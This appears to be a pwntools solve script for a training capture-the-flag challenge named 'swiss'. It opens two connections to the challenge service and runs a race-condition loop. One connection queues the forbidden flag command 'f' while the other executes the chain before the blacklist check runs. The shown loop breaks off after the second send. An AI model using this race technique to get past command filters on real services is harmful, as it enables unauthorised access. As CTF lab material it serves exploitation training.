from pwn import *

def get_token(c):
    c.recvuntil(b"token: ")
    return c.recvline().strip()


if args.REMOTE:
    c_token = remote("swiss.training.offensivedefensive.it", 8080, ssl=True)
    token = get_token(c_token)

    c1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
    c1.recvuntil(b"Token: ")
    c1.sendline(token)
    c2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
    c2.recvuntil(b"Token: ")
    c2.sendline(token)

else:
    c_port = process("./swiss")
    c_port.recvuntil(b"port: ")
    port = int(c_port.recvline().strip().decode())
    
    c1 = remote("127.0.0.1", port)
    c2 = remote("127.0.0.1", port)

# race condition, we insert command 'f' to get the flag and try to execute the chain with the second connection before the blacklist function is called
# run with python3 solve.py REMOTE DEBUG to see the flag
while 1:
    c1.recvuntil(b"chain\n")
    c2.recvuntil(b"chain\n")

    c1.sendline(b"1")
    c1.recvuntil(b"> ")
    c1.sendline(b"f")
    
    c2.sendline(b"4")
    